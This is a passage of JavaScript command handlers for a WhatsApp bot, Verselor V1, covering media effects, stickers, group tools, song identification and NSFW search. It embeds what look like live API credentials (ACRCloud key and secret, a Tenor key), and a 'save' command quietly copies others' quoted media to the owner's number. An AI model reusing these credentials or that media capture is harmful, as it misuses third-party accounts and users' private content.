                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                let media = await HeavstalTech.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return Vreply(err)
                let buff = fs.readFileSync(ran)
                HeavstalTech.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else Vreply(example(`reply to an audio`))
                } catch (e) {
                Vreply(e)
                }
                break;
//=================================================//          
                

case 'download':
case 'save': {
  if (!isCreator) return Vreply(mess.owner);
  const quotedMessage = m.msg.contextInfo.quotedMessage;
  if (quotedMessage) {
    if (quotedMessage.imageMessage) {
      let imageCaption = quotedMessage.imageMessage.caption;
      let imageUrl = await HeavstalTech.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
      HeavstalTech.sendMessage(botNumber, { image: { url: imageUrl }, caption: imageCaption });
    }
    if (quotedMessage.videoMessage) {
      let videoCaption = quotedMessage.videoMessage.caption;
      let videoUrl = await HeavstalTech.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            HeavstalTech.sendMessage(botNumber, { video: { url: videoUrl }, caption: videoCaption });
    }
  }
}
break;
//=================================================//


//=================================================//
case 'brat': {
  if (!text) return Vreply(`Provide text to turn into a Brat sticker!\nExample: ${prefix}brat HEAVSTAL TECH`);
  
  const inputText = text.trim();
  const imageUrl = `https://www.laurine.site/api/generator/brat?text=${encodeURIComponent(inputText)}`;
  
  try {
    await HeavstalTech.sendImageAsSticker(m.chat, imageUrl, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error('Brat sticker generation error:', err);
    Vreply(mess.error.feature, err);
  }
}
break;
//=================================================//


//=================================================//    
case 'script':
case 'sc':
case 'repo':
case 'repository': {
    const repoName = 'Verselor-V1';
    const owner = 'HeavstalTech';
    const repoUrl = `https://github.com/${owner}/${repoName}`;
    const zipUrl = `${repoUrl}/archive/refs/heads/main.zip`;
    const imageUrl = 'https://files.catbox.moe/g8pxls.png';
    let formattedInfo = '';

    try {
        const response = await fetch(`https://api.github.com/repos/${owner}/${repoName}`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
            }
        });
        const repoData = await response.json();

        formattedInfo =
            `${MenuStyle} *Repository Name :* ${repoData.name}\n` +
            `${MenuStyle} *Description :* ${repoData.description || 'No description'}\n` +
            `${MenuStyle} *Owner :* ${repoData.owner.login}\n` +
            `${MenuStyle} *Stars :* ${repoData.stargazers_count}\n` +
            `${MenuStyle} *Forks :* ${repoData.forks_count}\n` +
            `${MenuStyle} *URL :* ${repoData.html_url}\n`;
    } catch (error) {
        formattedInfo =
            `${MenuStyle} *Repository Name :* ${repoName}\n` +
            `${MenuStyle} *Status :* Unable to fetch live data\n` +
            `${MenuStyle} *URL :* ${repoUrl}\n`;
    }

    const RepoText = `
*VERSELOR V1 REPOSITORY*

> *REPOSITORY INFORMATION*

${formattedInfo}
---

*Deployment Instructions*

\`Follow these steps to deploy Verselor V1:\`

> 1. Fork this repository: ${repoUrl}
> 2. Get your *Authentication Code (Auth Code)* from: https://Heavstal-Bots.vercel.app
> 3. Download & upload the complete project files to your Node.js server.
> 4. Unzip & enter the "Verselor-V1-main" folder, select all files, and move them up one directory (“../”).  
> 5. Set the Node.js version of your environment to *v20.x or later* (recommended).
> 6. Start the deployment on your server — this takes ~2 minutes.
> 7. When prompted, input your Authentication Code (Auth Code).
> 8. When prompted, input your WhatsApp number and copy the 8-digit code.
> 9. Go to WhatsApp → Linked Devices → Link a Device → link with your phone number & enter the code.

\`📌 Note:\` 
1. If you see a QR code instead of prompt inputs, simply scan the QR code in WhatsApp to link your device.
2. If you want to deploy on a cloud service like render, replit or hekoru etc., simply click the button on the repo's readme

${footer}`;

    await HeavstalTech.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: RepoText
    }, { quoted: m });

    await sleep(1000);

    try {
        Vreply('📦 Downloading and sending Verselor V1 script...');
        await sleep(1000);
        await HeavstalTech.sendMessage(m.chat, {
            document: { url: zipUrl },
            fileName: 'Verselor-V1.zip',
            mimetype: 'application/zip',
            caption: `Verselor V1 Script\n\n${footer}`
        }, { quoted: m });
    } catch (error) {
        Vreply("Sorry, I couldn't send the file at the moment.");
    }
}
break;
//=================================================//


//=================================================//
case 'mode': {
if (!isCreator) return Vreply(mess.owner)
if (args[0] === 'group' || args[0] === 'gc') {
if (global.onlygroup == true) {
Vreply('*Already Activated*\n\nPlease Select Another Mode')
} else {
global.onlygroup = true
global.onlyprivate = false
Vreply('*Successfully Activated Only Group Mode*\n\nOnly Owners And Sudo Users Can Now Access The Bot In Private Chats')
}
} else if (args[0] === 'pc' || args[0] === 'private') {
if (global.onlyprivate == true) {
Vreply('*Already Activated*\n\nPlease Select Another Mode')
} else {
global.onlyprivate = true
global.onlygroup = false
Vreply('*Successfully Activated Only Privatw Mode*\n\nOnly Owners And Sudo Users Can Now Access The Bot In Group Chats')
}
} else if (args[0] === 'off') {
if (global.onlygroup == false && global.onlyprivate == false) {
Vreply('Only Group & Only Private Chat Is Not Yet Activated')
} else {
global.onlyprivate = false
global.onlygroup = false
await Vreply('*Succesfully deactivated only Private Chat & Only Group Mode*')
}
} else {
Vreply(`*INCORRECT USAGE*\n\nPlease select group/private/off\n*Example:* ${prefix}mode private`)
}
}
break;
//=================================================//


//=================================================//
case 'settimezone':
case 'set-timezone': 
case 'set-time-zone': {
            
            if (!isCreator) return Vreply(mess.owner)
            if (!text) return Vreply(`*INCORRECT USAGE*\n\nPlease Provide A Real Time Time-Zone\n*Example:* ${prefix + command} Africa/Lagos\n\n*Note/Disclaimer:* Adding An Incorrect Time-Zone May Cause Error, Be Sure That The Time Zone Is Correct`)
                global.timezone = text
                Vreply(`*Time-Zone Successfully Changed To ${text}*`)
                console.log(`SYSTEM UPDATE: Bot Time-Zone Has Ben Changed To ${text}`)
                }
                break;
//=================================================//      


//=================================================//           
case 'groupid':
case 'group-id':
case 'gcid':
case 'id-gc': 
case 'idgc': 
case 'checkidgc': {
if (!m.isGroup) return Vreply(mess.only.group);
if (m.isGroup && !isAdmin) return Vreply(mess.only.admin)
Vreply(`*Successfully Fetched Group Id*

> Group Details
➭ *Group Name:* ${groupName}
➭ *Group Id:* ${m.chat}
`)
}
break; 
//=================================================//


//=================================================//
case 'startupmsg': 
case 'startup-msg': {
if (!isCreator) return Vreply(mess.owner)
if (args[0] === 'on') {
if (global.startup == true) {
Vreply(`*Already Activated*\n\nSelect off to turn it off\n\n${footer}`)
} else {
global.startup = true
Vreply(`*Successfully Activated StartUp Message*\n\nYou Will Receives Recommendation Messages On Bot Restart(s)\n\n${footer}`)
}
} else if (args[0] === 'off') {
if (global.startup == false) {
Vreply(`*This Feature Is Already Disabled*\n\n${footer}`)
} else {
global.startup = false
await Vreply(`*Succesfully Deactivated StartUp Message(s)*\n\n${footer}`)
}
} else {
Vreply(`*INCORRECT USAGE*\n\nPlease select on/off\n*Example:* ${prefix + command} on/off\n\n${footer}`)
}
}
break;
//=================================================//


//=================================================//
case 'antitag': 
case 'anti-tag': {
if (!m.isGroup) return Vreply(mess.only.group)
if (!isBotAdmin) return Vreply(mess.badmin)
if (isAdmin) return Vreply(mess.only.admin)

if (!global.db.data.chats[m.chat]) {
    global.db.data.chats[m.chat] = {};
}

if (args[0] === 'on') {
if (global.db.data.chats[m.chat].antitag) {
Vreply('*Anti-Tag Is Already Activated In This Group Chat*')
} else {
global.db.data.chats[m.chat].antitag = true;
await global.db.write();
Vreply(`*Successfully Activated Anti-Tag In This Group Chat*\n\nMultiple Tags From Non Admins And Non Bot Owner Will Be Deleted And Tagger Will Be Kicked\n\n${footer}`)
}
} else if (args[0] === 'off') {
if (!global.db.data.chats[m.chat].antitag) {
Vreply('*Anti-Tag Is Already Deactivated In This Group Chat*')
} else {
global.db.data.chats[m.chat].antitag = false;
await global.db.write();
Vreply(`*Successfully Deactivated Anti-Tag In This Group Chat*\n\n${footer}`)
}
} else {
Vreply(`*INCORRECT USAGE*\n\nPlease select on/off\n*Example:* ${prefix + command} on`)
}
}
break;
//=================================================//


//=================================================//
case 'autoreact': 
case 'auto-react': 
case 'areact': {
if (!isCreator) return Vreply(mess.owner)

if (!global.db.data.chats[m.chat]) {
        global.db.data.chats[m.chat] = {};
    }
    
if (args[0] === 'on') {
if (global.db.data.chats[m.chat].autoReact) {
Vreply('*Auto-React Is Already Activated In This Chat*')
} else {
global.db.data.chats[m.chat].autoReact = true;
await global.db.write();
Vreply(`*Successfully Activated Auto-React In This Chat*\n\n${footer}`)
}
} else if (args[0] === 'off') {
if (!global.db.data.chats[m.chat].autoReact) {
Vreply('*Auto-React Is Already Deactivated In This Group Chat*')
} else {
global.db.data.chats[m.chat].autoReact = false;
await global.db.write();
Vreply(`*Successfully Deactivated AutoReact In This Chat*\n\n${footer}`)
}
} else {
Vreply(`*INCORRECT USAGE*\n\nPlease select on/off\n*Example:* ${prefix + command} off`)
}
}
break;
//=================================================//


//=================================================//
case 'checkgc':
case 'getgcinfo':
case 'infogc':
case 'info-gc':
case 'get-gc-info':
case 'check-gc': {
    if (!isCreator) return Vreply(mess.owner);
    if (!args[0]) return Vreply(`*INCORRECT USAGE*\n\nProvide a WhatsApp Group Link To Continue\n*Example:* ${prefix + command} https://chat.whatsapp.com/GROUP-ID\n\n${footer}`);
    
    let linkRegex = args.join(" ");
    let coded = linkRegex.split("https://chat.whatsapp.com/")[1];
    if (coded) coded = coded.split("?")[0].trim(); 
    if (!coded) return Vreply(`*Invalid Link*\n\nProvide a WhatsApp Group Link To Continue\n*Example:* ${prefix + command} https://chat.whatsapp.com/GROUP-ID\n\n${footer}`);

    await Vreply(mess.wait);

    try {
        const res = await HeavstalTech.query({
            tag: "iq",
            attrs: {
                type: "get",
                xmlns: "w:g2",
                to: "@g.us"
            },
            content:[{ tag: "invite", attrs: { code: coded } }]
        });

        if (!res || !res.content || !res.content[0]) {
            return Vreply("*Failed to fetch group info. The link might be revoked or invalid.*");
        }

        const attrs = res.content[0].attrs;
        const formatUnixDate = (unix) => {
            if (!unix) return "Not Set / Could Not Fetch";
            let dateStr = new Intl.DateTimeFormat('en-GB', {
                timeZone: global.timezone || 'Africa/Lagos',
                day: '2-digit', 
                month: '2-digit', 
                year: 'numeric',
                hour: '2-digit', 
                minute: '2-digit', 
                second: '2-digit', 
                hour12: false
            }).format(new Date(unix * 1000));
            return dateStr.replace(',', '');
        };

        const GROUP_INFO = `「 *Inspected Group Details* 」\n\n` +
            `▸ *Group Name:* ${attrs.subject || "Unknown"}\n` +
            `▸ *Group ID:* ${attrs.id ? attrs.id + "@g.us" : "Could Not Fetch"}\n` +
            `▸ *Desc Last Updated:* ${formatUnixDate(attrs.s_t)}\n` +
            `▸ *Group Creator:* ${attrs.creator ? "@" + attrs.creator.split("@")[0] : "No Longer Available"}\n` +
            `▸ *Group Created:* ${formatUnixDate(attrs.creation)}\n` +
            `▸ *Total Members:* ${attrs.size || "Could Not Fetch"} Members\n\n` +
            `${footer}`;

        let pp;
        try {
            pp = await HeavstalTech.profilePictureUrl(attrs.id + "@g.us", "image");
        } catch {
            pp = "https://files.catbox.moe/g8pxls.png";
        }

        await HeavstalTech.sendMessage(m.chat, { 
            image: { url: pp }, 
            caption: GROUP_INFO, 
            mentions: attrs.creator ?[attrs.creator] :[] 
        }, { quoted: m });
    } catch (error) {
        console.error("CheckGC Error:", error);
        Vreply(`*Error:* Failed to fetch group info. Ensure the link is valid and the group still exists.`);
    }
}
break;
//=================================================//


//=================================================//
case "listgc": 
case 'listgroup':
case 'list-gc':
case 'list-group': {
if (!isCreator) return Vreply(mess.owner)
let getGroups = await HeavstalTech.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF ALL THE GROUPS*
*Total Groups:* ${anu.length} Groups\n\n`
for (let x of anu) {
let metadata2 = await HeavstalTech.groupMetadata(x)
teks += `❏ Group List ${hituet+=1}
│⭔ *NAME :* ${metadata2.subject}
│⭔ *ID :* ${metadata2.id}
│⭔ *MEMBERS :* ${metadata2.participants.length}
╰────|\n\n`
}
Vreply(teks)
}
break;
//=================================================//


//=================================================//
case 'tiktokstalk': 
case 'tiktok-info': 
case 'tiktok-stalk': 
case 'tt-stalk': {
if (!isCreator) return Vreply(mess.owner);
if (!text) return Vreply(`*INCORRECT USAGE*\n*Example:* ${prefix + command} username\n\n${footer}`)
HeavstalTech.sendMessage(m.chat, { react: { text: `⏳`, key: m.key }})
try {
let info = await fetchJson(`https://api.junn4.my.id/tools/tiktokstalk?username=${q}`)
const name = info.result.name
const username = info.result.username
const followers = info.result.followers
const following = info.result.following
const description = info.result.description
await HeavstalTech.sendMessage(m.chat, { image: { url: info.result.pp_user}, caption: `*Name :* ${name || "No Name"}
*Username :* ${username || "No Username"}
*Followers :* ${followers || "0"}
*Following :* ${following || "0"}
*Description :* ${description || "Not Set"}
`}, {quoted: m})
await HeavstalTech.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
} catch (error) {
console.log(chalk.red(error));
Vreply(`*An Error Occured While Feacthing User Information*\n\n>Possible Causes\n1. User Account Is Private\n2. User Account Doesn't Exists\n3. Internal Server Error`);
}
}
break;
//=================================================//


//=================================================//
case 'sendlinkgc': 
case 'sendgclink':
case 'send-gc-link': {
if (!m.isGroup) return Vreply(mess.only.group)
if (!isCreator) return Vreply(mess.owner)
if (!isBotAdmin) return Vreply(mess.badm)
if (!args[0]) return reply(`*INCORRECT USAGE*\n*Exmaple 1:* ${prefix + command} number\n*Example 2:* ${prefix + command} 234xxx`)
Vreply(mess.wait)
await loading()
bnnd = text.split("|")[0] + '@s.whatsapp.net'
let response = await HeavstalTech.groupInviteCode(from)
HeavstalTech.sendText(bnnd, `Hello
*Click This Link To Join My WhatsApp Group*

*LINK:* https://chat.whatsapp.com/${response}

*Group Link:* ${groupMetadata.subject}`, m, { detectLink: true })
}
break;
//=================================================//


//=================================================//
case 'profile': 
case 'me': {
if (!isCreator) return Vreply(mess.owner)
let sender = m.sender;
    let ppUrl = await HeavstalTech.profilePictureUrl(sender, 'image').catch((_) => "https://telegra.ph/file/34d343582a1cf8f830a28.jpg");
    let pp = await (await fetch(ppUrl)).buffer();

    let OwnerInfo = `
—  *P R O F I L E*

┌  
│  ◦  *Name* : ${pushname}
│  ◦  *Number* : @${m?.sender.split('@')[0]}
└  
`.trim();

await HeavstalTech.sendMessage(m.chat, {
text: OwnerInfo,
contextInfo: {
externalAdReply: {  
title: `${global.developer}`,
body: `${global.developer}`,
thumbnailUrl: ppUrl,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'emojimix': { 
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) return Vreply(`*INCORRECT USAGE*\nExample : ${prefix + command} 😅+🤔\n\n${footer}`)
if (!emoji2) return Vreply(`*INCORRECT USAGE*\nExample : ${prefix + command} 😅+🤔\n\n${footer}`)
Vreply(mess.wait)
await loading()
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await HeavstalTech.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break;
//=================================================//

//=================================================//
case 'getname': 
case 'get-name': {
if (!isCreator) return Vreply(mess.owner)
if (qtod === "true") {
Vreply(mess.wait)
await loading()
name = await HeavstalTech.getName(m.quoted.sender)
Vreply(`*SUCCESSFULLY GOTTEN USERNAME*\n\n┃━ ${MenuStyle} *Name:* ${name}\n\n${footer}`)
} else if (qtod === "false") {
HeavstalTech.sendMessage(from, {text:`Reply To A Message To Continue\n\n${footer}`}, {quoted: m })
}
}
break;
//=================================================//

//=================================================//
case 'google': 
case 'search': {
 if (!text) return Vreply(`*NO QUERRY DETECTED*\n\nPlease Provide A Search Query\n\nExample : ${prefix + command} Smart TV`)
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
Vreply(teks)
})
}
break;
//=================================================//

//=================================================//
case 'hentai': {
if (!isCreator) return Vreply(mess.owner)
if (!global.db.data.chats[m.chat]?.nsfw) return Vreply(mess.nsfw)
Vreply(mess.wait)
await loading()
let sbe = await hentai()
let cejd = sbe[Math.floor(Math.random() * sbe.length)]; 
HeavstalTech.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'pornhubvid': 
case 'pornsearch': {
if (!isCreator) return Vreply(mess.owner)
if (!global.db.data.chats[m.chat]?.nsfw) return Vreply(mess.nsfw)
if (!text) return Vreply(`*INCORRECT USAGE*\n*Example:* ${prefix + command} stepmom`)
try {
let res = await searchVideo(text)
let teks = res.map((item, index) => {
    return `*[ RESULT ${index + 1} ]*
*Link :* ${item.link}
*Title :* ${item.title}
*Uploader :* ${item.uploader}
*Views :* ${item.views}
*Duration :* ${item.duration}
`
}).filter(v => v).join("\n")
await Vreply(teks)
} catch (e) {
await Vreply(eror)
}
}
break;
//=================================================//


//=================================================//
case 'nsfw': {
if (!isCreator && !isAdmin) return Vreply(mess.only.admin)

if (!global.db.data.chats[m.chat]) {
     global.db.data.chats[m.chat] = {};
  }

if (args[0] === 'on') {
if (global.db.data.chats[m.chat].nsfw) {
Vreply('*Nsfw Is Already Activated In This Chat*')
} else {
global.db.data.chats[m.chat].nsfw = true;
await global.db.write();
Vreply(`*Successfully Activated Nsfw In This Chat*\n\n${footer}`)
}
} else if (args[0] === 'off') {
if (!global.db.data.chats[m.chat].nsfw) {
Vreply('*Nsfw Is Already Deactivated In This Group Chat*')
} else {
global.db.data.chats[m.chat].nsfw = false;
await global.db.write();
Vreply(`*Successfully Deactivated Nsfw In This Chat*\n\n${footer}`)
}
} else {
Vreply(`*INCORRECT USAGE*\n\nPlease select on/off\n*Example:* ${prefix + command} off`)
}
}
break;
//=================================================//


//=================================================//
case 'shazam':
case 'findaudio':
case 'find':
case 'identifyaudio': {
         
if (!isCreator) return Vreply(mess.owner);
    if (!m.quoted || !(m.quoted.audio || m.quoted.video)) {
        return Vreply("Reply to an audio or video message to identify the song.");
    }
    try {
        const { buildStringToSign, sign } = require(path.join(__dirname, '..', 'System', 'Data1.js'));
        await HeavstalTech.sendMessage(m.chat, {react: {text: '🎶', key: m.key}})
        const media = await HeavstalTech.downloadAndSaveMediaMessage(m.quoted);

        // ACRCloud options
        const opt = {
            host: 'identify-eu-west-1.acrcloud.com',
            endpoint: '/v1/identify',
            signature_version: '1',
            data_type: 'audio',
            secure: true,
            access_key: '8c21a32a02bf79a4a26cb0fa5c941e95',
            access_secret: 'NRSxpk6fKwEiVdNhyx5lR0DP8LzeflYpClNg1gze',
        };

        const daa = await audioCut(media, 0, 15); 
        const data = daa.data;
        
        const current_data = new Date();
        const timestamp = current_data.getTime() / 1000;

        const stringToSign = buildStringToSign(
            'POST', opt.endpoint, opt.access_key, opt.data_type, opt.signature_version, timestamp
        );
        const signature = sign(stringToSign, opt.access_secret);
        
        const form = new FormData();
        form.append('sample', data);
        form.append('sample_bytes', data.length);
        form.append('access_key', opt.access_key);
        form.append('data_type', opt.data_type);
        form.append('signature_version', opt.signature_version);
        form.append('signature', signature);
        form.append('timestamp', timestamp);

        const res = await fetch('http://' + opt.host + opt.endpoint, {
            method: 'POST',
            body: form,
        });

        const { status, metadata } = await res.json();

        if (status.code === 0 && metadata.music.length > 0) {
            const track = metadata.music[0];
            let ytInfo = null;
            try {
                const searchQuery = `${track.title} ${track.artists[0].name}`;
                const ytResults = await yts(searchQuery);
                if (ytResults.videos.length > 0) {
                    ytInfo = ytResults.videos[0];
                }
            } catch (error) {
                console.error("YouTube search error:", error);
            }

            const resultText = `_*Audio Found!*_\n\n` +
                `➤ *Title*: ${track.title}\n` +
                `➤ *Artist*: ${track.artists.map(a => a.name).join(", ")}\n` +
                `➤ *Album*: ${track.album.name}\n` +
                `➤ *Released*: ${track.release_date || "N/A"}\n\n` +
                `*_Listen On:_*\n` +
                `➤ *Spotify*: ${track.external_metadata?.spotify?.track?.id ? 
                    `https://open.spotify.com/track/${track.external_metadata.spotify.track.id}` : "N/A"}\n` +
                `➤ *YouTube*: ${ytInfo ? ytInfo.url : 
                    (track.external_metadata?.youtube?.vid ? 
                    `https://youtube.com/watch?v=${track.external_metadata.youtube.vid}` : "N/A")}\n\n` +
                (ytInfo ? `*YouTube Info:*\n` +
                    `➤ *Views*: ${ytInfo.views.toLocaleString()}\n` +
                    `➤ *Duration*: ${ytInfo.duration.timestamp}\n` +
                    `➤ *Uploaded*: ${ytInfo.ago}\n` : '') + 
                `_*REPLY*_\n 1. audio\n 2. video\n_to download it!*_`;
            
            let thumbnailUrl = "https://via.placeholder.com/300";
            
            if (ytInfo?.thumbnail) {
                thumbnailUrl = ytInfo.thumbnail;
            } else if (track.external_metadata?.spotify?.album?.id) {
            }

            var sMsg = await HeavstalTech.sendMessage(m.chat, { image: { url: thumbnailUrl }, caption: resultText }, { quoted: m });

            
            try {
                const rMsg = await someResponseCollector(m.chat, Vreplyer, 60000); // Wait 60s for a reply
                
                await HeavstalTech.sendMessage(m.chat, {react: {text: "⏰", key: m.key}});
                const rs = rMsg.text.toLowerCase();
                
                if (rs === "audio" || rs === "1") {
                    if (!ytInfo) return await Vreply("Sorry, YouTube link not available to download audio.");
                    const mp3Link = await ytaudio(ytInfo.url);
                    await HeavstalTech.sendMessage(m.chat, { audio: { url: mp3Link.url }, mimetype: "audio/mpeg" }, { quoted: rMsg });
                } else if (rs === "video" || rs === "2") {
                    if (!ytInfo) return Vreply("Sorry, YouTube link not available to download video.");
                    const mp4Link = await ytvideo(ytInfo.url);
                    await HeavstalTech.sendMessage(m.chat, { video: { url: mp4Link.url }, caption: `Video for ${ytInfo.title}` }, { quoted: rMsg });
                } else {
                    return Vreply("Invalid option. Please reply with either '1' for audio or '2' for video.");
                }
            } catch (e) {
                console.error("Response handling error:", e);
                await HeavstalTech.sendMessage(m.chat, {react: {text: "", key: m.key}});
            }         
        } else {
            return Vreply("_Couldn't find that song..._");
        }
        const filesToDelete = [media, daa.path];
        for (const file of filesToDelete) {
            if (fs.existsSync(file)) {
                fs.unlinkSync(file);
            }
        }
    } catch (error) {
        console.error(error);
        return Vreply(`An error occurred: ${error.message || "Unknown error"}`);
    }
}
break;
//=================================================//


//=================================================//  
      case 'archive': {             
if (!isCreator) return Vreply(mess.owner);
        try {
            const lmsg = {
                message: m.message,
                key: m.key,
                messageTimestamp: m.timestamp
            };
            await HeavstalTech.chatModify({
                archive: true,
                lastMessages: [lmsg]
            }, m.chat);
            return Vreply(`*SUCCESSFULLY ARCHIEVED THIS CHAT*\n\n${footer}`);
        } catch (e) {
            console.log("command error", e);
            return Vreply(e);
        }
    }
    break;
//=================================================//    
    

//=================================================//
    case 'unarchive': {       
if (!isCreator) return Vreply(mess.owner);
        try {
            const lmsg = {
                message: m.message,
                key: m.key,
                messageTimestamp: m.timestamp
            };
            await HeavstalTech.chatModify({
                archive: false,
                lastMessages: [lmsg]
            }, m.chat);
            return Vreply(`*SUCCESSFULLY UNARCHIEVED THIS CHAT*\n\n${footer}`);
        } catch (e) {
            console.log("cmd error", e);
            return Vrpely(e);
        }
    }
    break;
//=================================================//    


//=================================================//      
    case 'pinchat':
    case 'chatpin': {             
if (!isCreator) return Vreply(mess.owner);
        try {
            await HeavstalTech.chatModify({
                pin: true
            }, m.chat);
            return Vreply(`*Chat Pined Successfully*\n\n${footer}`);
        } catch (e) {
            console.log("cmd error", e);
            return Vreply(e);
        }
    }
    break;
//=================================================//


//=================================================//
    case 'unpinchat':
    case 'unchatpin': {         
if (!isCreator) return Vreply(mess.owner);
        try {
            await HeavstalTech.chatModify({
                pin: false
            }, m.chat);
            return Vreply(`*Chat Unpined Successfully*\n\n${footer}`);
        } catch (e) {
            console.log("cmd error", e);
            return Vreply(e);
        }
    }
    break;  
//=================================================//     


//=================================================//    
    case 'setname': {         
if (!isCreator) return Vreply(mess.owner);
        try {
            const q = text;
            if (!q) return Vreply(`_*provide a name to set!*_\n_Example: ${prefix}setname Heavstal Tech`);
            await HeavstalTech.updateProfileName(q);
            return Vreply(`_Profile name updated to ${q}_`);
        } catch (e) {
            console.log("cmd error", e);
            return Vreply(e);
        }
    }
    break;
//=================================================//    


//=================================================//
    case 'bio':
    case 'setbio': {             
if (!isCreator) return Vreply(mess.owner);
        try {
            const query = text;
            if (!query) return Vreply(`*_Provide A Text*_\n_example: ${prefix}setbio urgent calls only._`);
            await HeavstalTech.updateProfileStatus(query);
            return Vreply('_Bio updated_');
        } catch (e) {
            console.log("cmd error", e);
            return Vreply(e);
        }
    }
    break;
//=================================================//    
    
    

//=================================================//    
    case 'forward':
    case 'fwrd': {     
if (!isCreator) return Vreply(mess.owner);
        try {
            if (!m.quoted) return Vreply("*Reply to the message you want to forward*");
            if (!text) return Vreply(` *INCORRECT USAGE*\n\n_Provide a number or jid!_\n*Example 1:* ${prefix + command}234xxxxxx\n*Example 2:*${prefix + command}234xxxx@s.whatsapp.net\n\nuse ${prefix}jid to get the jid of a chat`);

            let jidd;
            if (text.includes("@g.us") || text.includes("@s.whatsapp.net") || text.includes("newsletter")) {
                jidd = text;
            } else {
                jidd = `${text}@s.whatsapp.net`;
            }

            await m.forwardMessage(jidd, await store.loadMessage(m.chat, m.quoted));
        } catch (e) {
            console.log("cmd error", e);
            return Vreply(e);
        }
    }
    break;
//=================================================//        
  
      
//=================================================//
    case 'setcmd': {         
if (!isCreator) return Vreply(mess.owner);
        try {
            if (!m.quoted || !m.quoted.sticker) return Vreply(`_Reply to a sticker with ${prefix}setcmd <command>_\n*Example:* ${prefix}setcmd ping\n\n${footer}`);
            if (!text) return Vreply(`_Provide a command also.._`);

            const f = text?.trim()?.split(/\s+/)[0];
            const hash = m.quoted.fileSha256 ? Buffer.from(m.quoted.fileSha256).toString('hex') : null;
            if (!hash) return Vreply("*Couldn't get stk hash*");
            global.db.data.sticker_cmd[hash] = text;
                   await global.db.write();
            return Vreply(`❏ Sticker set to *${f}*`);
        } catch (e) {
            console.log("cmd error", e);
            return Vreply(e);
        }
    }
    break;
//=================================================//


//=================================================//
    case 'delcmd': {
if (!isCreator) return Vreply(mess.owner);
        try {
            if (!m.quoted || !m.quoted.sticker) {
                return Vreply(`_Reply to a sticker to delete its command_`);
            }
            const hash = m.quoted.fileSha256 ? Buffer.from(m.quoted.fileSha256).toString("hex") : null;
            if (!hash) return Vreply(`_hash not found_`);
           if (!global.db.data.sticker_cmd[hash]) return Vreply(`_no cmd found for that sticker.._`);
         const oldCmd = global.db.data.sticker_cmd[hash];
         delete global.db.data.sticker_cmd[hash];
            await global.db.write();
            return Vreply(`*cmd deleted!*\n_from:_ *${oldCmd}*`);
        } catch (e) {
            console.log("cmd error", e);
            return Vreply(e);
        }
    }
    break;
//=================================================//    


//=================================================//
    case 'listcmd':
    case 'listcmds': {         
        if (!isCreator) return Vreply(mess.owner);
        try {
            const stk_cmd = global.db.data.sticker_cmd || {};
            const entries = Object.entries(stk_cmd);
            
            if (entries.length === 0) {
                return Vreply(`_No sticker commands have been set yet._`);
            }
            
            let responseText = `❏ *Sticker Commands:*\n\n`;
            for (const [hash, command] of entries) {
                responseText += `❏ *${command}*\n_↳ hash:_ \`${hash.slice(0, 16)}...\`\n\n`;
            }
            
            return Vreply(responseText.trim());
        } catch (e) {
            console.log("cmd error", e);
            return Vreply(e);
        }
    }
    break;
//=================================================//   
    

//=================================================//
case 'carbon': {
    try { 
        if (!isCreator) return Vreply(mess.owner);
        Vreply(mess.wait)
await loading();
        const codeText = m.quoted?.text || text;        
        if (!codeText) {
            return Vreply(`*${MenuStyle} Provide code or reply to a message with code.*\n_Example: ${prefix}carbon console.log("Hello World")_\n\n${footer}`);
        }       
        const apiUrl = `https://api.nexoracle.com/image-creating/carbon-img?apikey=free_key@maher_apis&text=${encodeURIComponent(codeText)}`;
        await HeavstalTech.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `${global.CAPTION}\n\n${footer}`
        }, { quoted: m });
        await HeavstalTech.sendMessage(m.chat, {react: {text: "✅", key: m.key}});
    } catch (err) {
        console.error(err);
        return Vreply(`${mess.error.fitur}\n_Details: ${err.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'wanted':
case 'wasted':
case 'rainbow':
case 'trigger-meme':
case 'rip-meme':
case 'mnm':
case 'jail':
case 'invert': {
    try {
        if (!m.quoted && !/image/.test(mime)) {
            return Vreply(`*${MenuStyle} Please reply to a user or an image to use this command.*\n\n${footer}`);
        }
        Vreply(mess.wait)
        await loading();
        const effect = commandText.replace('-meme', '');
        const imgUrl = await getImageUrl(m, HeavstalTech);
